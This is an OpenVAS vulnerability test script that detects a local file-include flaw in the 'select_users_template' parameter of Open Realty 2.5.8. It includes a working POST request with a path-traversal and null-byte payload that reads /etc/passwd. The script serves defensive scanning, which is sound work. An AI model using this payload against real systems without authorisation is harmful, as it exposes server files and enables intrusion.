###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_open_realty_52296.nasl 12 2013-10-27 11:15:33Z jan $
#
# Open Realty 'select_users_template' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Open Realty is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information or to execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the computer; other attacks are
also possible.

Open Realty version 2.5.8 is vulnerable; other versions may also
be affected.";


if (description)
{
 script_id(103443);
 script_bugtraq_id(52296);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Open Realty 'select_users_template' Parameter Local File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52296");
 script_xref(name : "URL" , value : "http://www.open-realty.org/");
 script_xref(name : "URL" , value : "http://yehg.net/lab/pr0js/advisories/%5Bopen-realty_2.5.8_2.x%5D_lfi");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-03-06 11:55:55 +0100 (Tue, 06 Mar 2012)");
 script_description(desc);
 script_summary("Determine if Open Realty is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/open-realty","/openrealty",cgi_dirs());
host = get_host_name();

foreach dir (dirs) {

  url = dir + "/index.php";

  if(http_vuln_check(port:port, url:url,pattern:('meta name="Generator" content="Open-Realty"|Powered by.*Open-Realty'))) {

    req = string("POST ",dir,"/index.php HTTP/1.1\r\n",
                 "Host: ",host,"\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: 84\r\n",
                 "\r\n",
                 "select_users_template=../../../../../../../../../../../../../../../etc/passwd%00\r\n\r\n");

    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if(result =~ "root:.*:0:[01]:.*") {
      security_hole(port:port);
      exit(0);
    }
  }   
}

exit(0);
